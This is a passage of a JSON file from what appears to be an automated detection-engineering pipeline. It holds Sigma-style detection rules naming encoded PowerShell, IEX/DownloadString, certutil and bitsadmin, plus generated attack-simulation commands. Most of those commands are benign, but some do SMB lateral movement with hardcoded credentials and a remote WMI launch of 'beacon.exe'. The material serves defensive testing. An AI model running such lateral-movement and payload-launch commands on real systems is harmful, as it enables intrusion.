        },
        "falsepositives": [
          "Legitimate administrative use of PowerShell to query system processes or display information",
          "Automated scripts that use Get-Process for monitoring purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1010",
          "custom.windows",
          "custom.powershell"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Window Discovery",
        "generation_method": "langchain",
        "id": "2ac52ac7-2679-4abb-b466-cea3207ca9a2",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 16,
          "query_time_ms": 713.0
        }
      },
      {
        "title": "System Information Discovery via PowerShell (Encoded & Shortcut Execution)",
        "description": "Detects PowerShell processes used for system information discovery, including Get-WinEvent and Get-ADDomainController commands, Base64\u2011encoded payloads, and execution via .lnk shortcuts. Also checks for common parent launchers.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_ps": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Get-WinEvent",
              "Get-ADDomainController"
            ]
          },
          "selection_base64": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|re": "(-enc|/EncodedCommand)\\s+[A-Za-z0-9+/]{20,}={0,2}"
          },
          "selection_lnk": {
            "Image|endswith": ".lnk"
          },
          "selection_parent": {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\rundll32.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          "condition": "(selection_ps or selection_base64) and selection_parent or selection_lnk"
        },
        "falsepositives": [
          "Legitimate administrative scripts that query event logs (Get-WinEvent) or Active Directory (Get-ADDomainController).",
          "Automation tasks that use PowerShell -EncodedCommand for deployment or configuration management.",
          "Normal user execution of shortcut (.lnk) files to launch applications.",
          "Routine use of cmd.exe, rundll32.exe, wscript.exe or cscript.exe as parent processes for legitimate tasks."
        ],
        "level": "high",
        "tags": [
          "attack.t1082",
          "attack.discovery",
          "custom.windows",
          "custom.sysmon",
          "custom.powershell",
          "custom.base64",
          "custom.shortcut"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "generation_method": "langchain",
        "id": "8f2021de-e3aa-4282-922c-f7deba414945",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 52,
          "query_time_ms": 712.0
        }
      },
      {
        "title": "Data from Local System via PowerShell Cmdlets",
        "description": "Detects use of PowerShell cmdlets Get-Content and Compress-Archive to collect and compress data locally, indicative of data staging for exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Get-Content",
              "Compress-Archive"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative scripts that read and compress files",
          "Automated backup or reporting tools using PowerShell"
        ],
        "level": "high",
        "tags": [
          "attack.t1005",
          "car.2013-06-002",
          "dfir.collection.data_staging",
          "custom.powershell"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data from Local System",
        "generation_method": "langchain",
        "id": "8c8e3ad2-2f8b-4203-85f1-cf9adff6c990",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete",
          "events_found": 2,
          "query_time_ms": 699.0000000000001
        }
      },
      {
        "title": "Network Service Scanning via PowerShell and Common Tools",
        "description": "Detects potential network service scanning activity using PowerShell cmdlets such as Get-NetTCPConnection, Test-NetConnection, and related discovery commands.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe"
          },
          "selection_cmdlets": {
            "CommandLine|contains": [
              "Get-NetTCPConnection",
              "Test-NetConnection",
              "-PortScan",
              "Get-NetAdapter",
              "Get-NetIPConfiguration"
            ]
          },
          "condition": "selection_powershell and selection_cmdlets"
        },
        "falsepositives": [
          "Legitimate network troubleshooting by administrators",
          "Automated inventory or monitoring scripts",
          "PowerShell-based configuration management tools"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1046",
          "car.2016-04-002",
          "dfir.windows"
        ],
        "ttp_id": "unknown",
        "technique_name": "Network Service Scanning",
        "generation_method": "langchain",
        "id": "990324b6-5202-4629-a318-e3d8cd7d0425",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 12,
          "query_time_ms": 574.0000000000001
        }
      },
      {
        "title": "Create or Modify System Process via Suspicious PowerShell or Shortcut Execution",
        "description": "Detects creation or modification of critical system processes (svchost.exe, lsass.exe, lsm.exe) when launched with Base64\u2011encoded PowerShell commands, via suspicious parent processes, or through .lnk shortcut execution, indicating potential persistence activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_system_process": {
            "Image|endswith": [
              "\\svchost.exe",
              "\\lsass.exe",
              "\\lsm.exe"
            ]
          },
          "selection_suspicious_cmd": {
            "CommandLine|re": "(?i)-EncodedCommand\\s+[A-Za-z0-9+/=]+"
          },
          "selection_suspicious_parent": {
            "ParentImage|endswith": [
              "\\powershell.exe",
              "\\cmd.exe",
              "\\rundll32.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          "selection_lnk_execution": {
            "Image|endswith": ".lnk"
          },
          "condition": "selection_system_process and (selection_suspicious_cmd or selection_suspicious_parent or selection_lnk_execution)"
        },
        "falsepositives": [
          "Legitimate administrative PowerShell scripts that use -EncodedCommand for deployment or configuration.",
          "Scheduled tasks or system services that legitimately restart svchost.exe, lsass.exe, or lsm.exe.",
          "User-created .lnk shortcuts that launch allowed applications.",
          "System maintenance tools that invoke rundll32.exe or wscript.exe as part of normal operation."
        ],
        "level": "high",
        "tags": [
          "attack.t1543",
          "attack.persistence",
          "attack.t1059.001",
          "attack.t1105",
          "custom.sysmon",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "f5ec9fc7-5efe-49b1-89dd-509d1f067da1",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 70,
          "query_time_ms": 640.0
        }
      },
      {
        "title": "Command and Scripting Interpreter Activity Detected via Enhanced Behavioral Patterns",
        "description": "Detects execution of command\u2011line interpreters, PowerShell with Base64\u2011encoded payloads, WScript, shortcut files, and Office applications launching shells, indicating possible Command and Scripting Interpreter abuse.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "/k"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-EncodedCommand",
              "Invoke-Expression",
              "IEX",
              "DownloadString"
            ],
            "CommandLine|regex": "(?i)-enc\\s+[A-Za-z0-9+/]{100,}={0,2}"
          },
          "selection_wscript": {
            "Image|endswith": "\\wscript.exe",
            "CommandLine|contains": [
              "//B",
              "//E:jscript",
              "//E:vbscript"
            ]
          },
          "selection_lnk": {
            "Image|endswith": ".lnk"
          },
          "selection_office": {
            "ParentImage|endswith": [
              "\\WINWORD.EXE",
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ]
          },
          "condition": "selection_cmd or selection_powershell or selection_wscript or selection_lnk or selection_office"
        },
        "falsepositives": [
          "Legitimate administrative scripts executed via cmd.exe or powershell.exe",
          "Scheduled tasks or startup scripts that use PowerShell with -EncodedCommand for legitimate purposes",
          "Office macros that legitimately invoke command shells for automation",
          "User\u2011initiated opening of .lnk shortcuts that point to benign applications"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "attack.t1059.003",
          "attack.t1059.001",
          "attack.t1059.005",
          "attack.t1204"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "f36023f7-549c-478b-b1b8-0c19e80aea0f",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 58,
          "query_time_ms": 595.0
        }
      },
      {
        "title": "Obfuscated Files or Information Detection",
        "description": "Detects obfuscated files or information using command-line patterns, Base64-encoded PowerShell, and .lnk file execution commonly seen in defense evasion techniques.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell_base64": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "/e",
              "/enc"
            ],
            "CommandLine|regex": "[a-zA-Z0-9\\+\\/]{50,}={0,2}"
          },
          "selection_powershell_obfuscated": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "IEX",
              "Invoke-Expression",
              "Compress-Archive",
              "Expand-Archive"
            ]
          },
          "selection_lnk_execution": {
            "Image|endswith": ".lnk"
          },
          "selection_script_host_parent": {
            "ParentImage|endswith": [
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe",
              "\\rundll32.exe",
              "\\cmd.exe"
            ]
          },
          "condition": "(selection_powershell_base64 or selection_powershell_obfuscated or selection_lnk_execution) and selection_script_host_parent"
        },
        "falsepositives": [
          "Legitimate administrative scripts using Base64 encoding",
          "User launching .lnk files from trusted locations",
          "Automated tools using PowerShell with obfuscated-like syntax"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1027",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "id": "ea01f78a-778c-4f55-97ee-761e6176d80c",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 46,
          "query_time_ms": 607.0
        }
      },
      {
        "title": "Exfiltration Over C2 Channel via Command Line Tools",
        "description": "Detects exfiltration over C2 channel using common command-line tools and encoding techniques such as PowerShell -enc, certutil, bitsadmin, and cmd.exe redirection.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell_encoded": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc",
            "CommandLine|regex": "-enc(?:ode)?[ =][A-Za-z0-9+/=]{100,}"
          },
          "selection_powershell_web": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "Invoke-RestMethod",
              "Out-File",
              "System.Net.WebClient"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-encode",
              "-decode",
              "-urlcache"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http"
            ]
          },
          "selection_cmd_redirect": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              ">",
              ">>",
              "echo",
              "/c"
            ]
          },
          "condition": "selection_powershell_encoded or selection_powershell_web or selection_certutil or selection_bitsadmin or selection_cmd_redirect"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell web cmdlets",
          "Software installers using certutil for certificate management",
          "Scheduled tasks using bitsadmin for downloads",
          "Batch scripts using cmd.exe redirection for logging"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.T1071.001",
          "attack.T1027",
          "custom.detection-rule",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "generation_method": "langchain",
        "id": "bfedfaa6-6526-4fa2-a742-b3f7d84339fe",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 193,
          "query_time_ms": 688.0
        }
      },
      {
        "title": "Archive Collected Data via Archiving Tools",
        "description": "Detects use of common archiving utilities (7z, zip, tar, PowerShell) to compress data, which may indicate data collection prior to exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_7z": {
            "Image|endswith": "\\7z.exe",
            "CommandLine|contains": [
              "a",
              "u"
            ]
          },
          "selection_zip": {
            "Image|endswith": "\\zip.exe",
            "CommandLine|contains": [
              "-r",
              ".zip"
            ]
          },
          "selection_tar": {
            "Image|endswith": "\\tar.exe",
            "CommandLine|contains": [
              "-c",
              ".tar"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Compress-Archive",
              "7z a",
              "tar -c",
              "zip -r"
            ]
          },
          "condition": "selection_7z or selection_zip or selection_tar or selection_powershell"
        },
        "falsepositives": [
          "Legitimate software packaging or backup activities",
          "DevOps or system administration scripts that archive logs or configurations",
          "Software updates that include compressed payloads"
        ],
        "level": "medium",
        "tags": [
          "attack.t1560",
          "attack.collection",
          "car.2016-04-004"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "89fe07e1-595f-453e-a73e-1b405949f0a5",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 16,
          "query_time_ms": 645.0
        }
      },
      {
        "title": "Persistence via Registry Run Keys and Shortcut Execution with Encoded PowerShell",
        "description": "Detects creation or modification of Registry Run Keys, execution of .lnk shortcuts, and PowerShell commands that contain Base64\u2011encoded payloads, indicating attempts to establish persistence on Windows systems.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_registry_modification": {
            "Image|endswith": [
              "\\reg.exe",
              "\\regedit.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": [
              "run",
              "runonce",
              "runas"
            ]
          },
          "selection_lnk_execution": {
            "Image|endswith": ".lnk"
          },
          "selection_base64_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|regex": "(-enc|/enc)\\s+[A-Za-z0-9+/=]{20,}"
          },
          "selection_parent_process": {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\rundll32.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\powershell.exe"
            ]
          },
          "condition": "(selection_registry_modification and selection_parent_process) or selection_lnk_execution or selection_base64_powershell"
        },
        "falsepositives": [
          "Legitimate administrative scripts using reg.exe or regedit.exe to modify Run keys.",
          "Scheduled tasks or system maintenance tools that create .lnk shortcuts.",
          "PowerShell scripts that legitimately use -enc for encoded commands (e.g., internal automation).",
          "IT automation platforms that invoke rundll32.exe or wscript.exe for benign purposes."
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.t1547.001",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Registry Run Keys",
        "generation_method": "langchain",
        "id": "7e0c1a4a-2006-461f-8475-06805c27b870",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 50,
          "query_time_ms": 583.0
        }
      }
    ],
    "status": "success"
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "average_quality_score": 0.6432352941176472
    }
  },
  "attacks": [
    {
      "id": "2096eef8-5159-44e0-a52a-29199cc4e188",
      "ttp_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path $env:TEMP\\testfile.txt -Value 'Benign test content' -Force\"",
      "description": "Basic PowerShell file creation in TEMP directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates testfile.txt in %TEMP% with benign content using PowerShell's Set-Content. Demonstrates file write capability.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:54:09.512758",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.718,
      "validated": true
    },
    {
      "id": "afdf0ce7-dc43-4c30-ab48-be437bc662af",
      "ttp_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABUAGUAcwB0ACIA",
      "description": "Intermediate encoded command execution",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Executes base64-encoded command (UTF-16LE) to write 'PowerShell Test' to console. Shows command obfuscation via encoding.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:54:09.512758",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.718,
      "validated": true
    },
    {
      "id": "df1cbd6a-c094-420e-8cc1-26b5bc7b5370",
      "ttp_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "schtasks /Create /TN \"CleanupTask\" /TR \"powershell -Command \\\"Write-Output 'Task executed'; Remove-Item $env:TEMP\\testfile.txt -ErrorAction SilentlyContinue\\\"\" /SC ONCE /ST 00:00 /F && schtasks /Run /TN \"CleanupTask\" && schtasks /Delete /TN \"CleanupTask\" /F",
      "description": "Advanced scheduled task execution chain",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates/runs/deletes scheduled task that executes PowerShell command to write output and clean TEMP file. Demonstrates task persistence mechanics with cleanup.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:54:09.512758",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.718,
      "validated": true
    },
    {
      "id": "38f9455a-a647-4525-8fa4-e8809bc73976",
      "ttp_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "pwsh -Command \"Write-Output 'Test: PowerShell execution on Linux'\"",
      "description": "Basic demonstration that PowerShell can be invoked on Linux and produce output.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command prints the string \"Test: PowerShell execution on Linux\" to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:02:08.492503",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.718,
      "validated": true
    },
    {
      "id": "2c789f21-85f1-47d7-b438-bddf23548381",
      "ttp_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "pwsh -Command \"Invoke-WebRequest -Uri 'https://example.com' -OutFile '$HOME/pstest.txt' -UseBasicParsing; Get-Content '$HOME/pstest.txt'; Remove-Item '$HOME/pstest.txt' -ErrorAction SilentlyContinue\"",
      "description": "Intermediate example that downloads a benign file to the user's home directory, displays its contents, and then removes it safely.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell fetches the content from https://example.com, saves it as pstest.txt in the user's home directory, prints the file content, and finally deletes the file without raising an error if deletion fails.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:02:08.492503",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.718,
      "validated": true
    },
    {
      "id": "926969fc-173c-4de9-9663-fbe2fff02e8b",
      "ttp_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_id": "eedbb5ef-32ec-4a45-a241-c15634f592d1",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "pwsh -Command \"Start-Job -ScriptBlock { Get-Process | Where-Object { $_.CPU -gt 0 } } | Receive-Job -Wait\"",
      "description": "Advanced usage of PowerShell jobs to enumerate running processes with non\u2011zero CPU usage, demonstrating background execution and pipeline filtering.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A background PowerShell job is created that lists processes consuming CPU time; the results are returned to the console after the job completes.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:02:08.492503",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.718,
      "validated": true
    },
    {
      "id": "033e75a3-6cb2-421a-a13c-67d15e57181e",
      "ttp_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-Process | Out-String\"",
      "description": "Basic PowerShell execution that lists running processes; demonstrates PowerShell activity without requiring elevated privileges.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of current processes to the console.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:47.375730",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "31957b5f-bfcd-4b77-96d5-90833420ca20",
      "ttp_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path $env:TEMP\\dummy.b64 -Value 'SGVsbG8gd29ybGQ=' -Encoding ASCII -Force; certutil -decode $env:TEMP\\dummy.b64 $env:TEMP\\dummy.txt\"",
      "description": "Intermediate example that writes a Base64\u2011encoded string to a temporary file and decodes it with certutil, showing file handling and PowerShell command chaining.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates dummy.b64 containing 'Hello world' in Base64, decodes it to dummy.txt, resulting in a plain\u2011text file with the string 'Hello world' in the TEMP directory.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:47.375730",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "a0328d25-90ac-487c-adb6-ec5e02aee580",
      "ttp_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"schtasks.exe /Create /SC ONLOGON /TN 'TestTask' /TR \\\"cmd.exe /c echo Hello > $env:TEMP\\\\hello.txt\\\" /F\"",
      "description": "Advanced example that registers a scheduled task to run a benign command at user logon, illustrating persistence techniques via legacy binaries invoked from PowerShell.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a scheduled task named 'TestTask' that writes 'Hello' to hello.txt in the TEMP folder each time the user logs on.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:47.375730",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "39d4befb-86fb-408c-8be8-63aaeba0c94b",
      "ttp_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "pwsh -Command \"Get-Process | Select-Object -First 5\"",
      "description": "Retrieves a short list of currently running processes (first five) using PowerShell core.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs the names, IDs, and basic info of the first five processes to the console.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:00:17.443112",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "dcab5491-60e9-4ee0-91ce-da28b9bba2a4",
      "ttp_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "pwsh -Command \"mkdir -p $env:HOME/tmp -ErrorAction SilentlyContinue; Set-Content -Path \\\"$env:HOME/tmp/hello.ps1\\\" -Value 'Write-Output \\\"Hello from PowerShell\\\"' -Force; pwsh -File \\\"$env:HOME/tmp/hello.ps1\\\"\"",
      "description": "Creates a temporary PowerShell script that prints a greeting, then executes the script. Demonstrates file creation, use of -Force, and script execution.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file `hello.ps1` is written to $HOME/tmp containing a Write-Output command, and when executed it prints \"Hello from PowerShell\" to the console.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:00:17.443112",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "44f75d34-09a2-4390-abaf-04d9aec7dc3d",
      "ttp_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_id": "80026e3b-99e7-4e24-a21f-5a725d1498c0",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "pwsh -EncodedCommand \"RwBlAHQALQBQAHIAbwBjAGUAcwBzACA... (base64 string)\"",
      "description": "Executes an encoded PowerShell command that gathers all running processes, converts the result to JSON, and writes it to a file in the user's home directory. Shows use of encoded commands for stealth.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates `$HOME/tmp/proc.json` containing a JSON array with details of all running processes.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:00:17.443112",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "a0df28d5-7bf1-4dee-9d2d-f6782ea3c437",
      "ttp_id": "1b798f72-bf50-48e1-86ac-ee20b0ed19fd",
      "technique_id": "T1021.002",
      "technique_name": "SMB/Windows Admin Shares",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "net use \\\\192.168.1.100\\C$ /user:Administrator P@ssw0rd",
      "description": "Map an administrative C$ share from a remote system using provided credentials",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Establishes an authenticated SMB session to the remote C$ share using the specified username and password. This allows file access to the C: drive on the target.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:44.264888",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "c6147315-008e-4a69-a495-f9bedcc003e0",
      "ttp_id": "1b798f72-bf50-48e1-86ac-ee20b0ed19fd",
      "technique_id": "T1021.002",
      "technique_name": "SMB/Windows Admin Shares",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "copy C:\\Users\\Public\\stage.exe \\\\192.168.1.100\\C$\\Users\\Public\\stage.exe /Y",
      "description": "Copy a staged executable to the remote system's C$ share",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Copies a local file to the remote C$ share. The /Y flag suppresses prompting for confirmation. This simulates placing a payload on a remote host for execution.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:44.264888",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "6e4cc4ac-1abc-4452-a93b-c4954106558e",
      "ttp_id": "1b798f72-bf50-48e1-86ac-ee20b0ed19fd",
      "technique_id": "T1021.002",
      "technique_name": "SMB/Windows Admin Shares",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c copy %TEMP%\\\\beacon.exe %APPDATA%\\\\ && start %APPDATA%\\\\beacon.exe' -ComputerName 192.168.1.100 -EnableAllPrivileges\"",
      "description": "Remotely execute a command via WMI over SMB to copy and launch a file from a shared path",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Uses WMI to execute a command on the remote system. The command copies a file from %TEMP% to %APPDATA% and starts it. SMB is used as the transport for WMI communication.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:53:44.264888",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "2cda4a97-a277-4ab4-a5e1-7e1dfdfb58a5",
      "ttp_id": "1b798f72-bf50-48e1-86ac-ee20b0ed19fd",
      "technique_id": "1b798f72-bf50-48e1-86ac-ee20b0ed19fd",
      "technique_name": "SMB/Windows Admin Shares",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "smbclient //192.168.1.10/C$ -U 'admin%Password123' -c 'ls'",
      "description": "Enumerates the contents of the remote Windows C$ administrative share using SMB client.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Lists files and directories on the remote C$ share and prints them to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:56:29.527791",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "0d227cbc-df9e-4d73-95f8-0749c905494a",
      "ttp_id": "1b798f72-bf50-48e1-86ac-ee20b0ed19fd",
      "technique_id": "1b798f72-bf50-48e1-86ac-ee20b0ed19fd",
      "technique_name": "SMB/Windows Admin Shares",
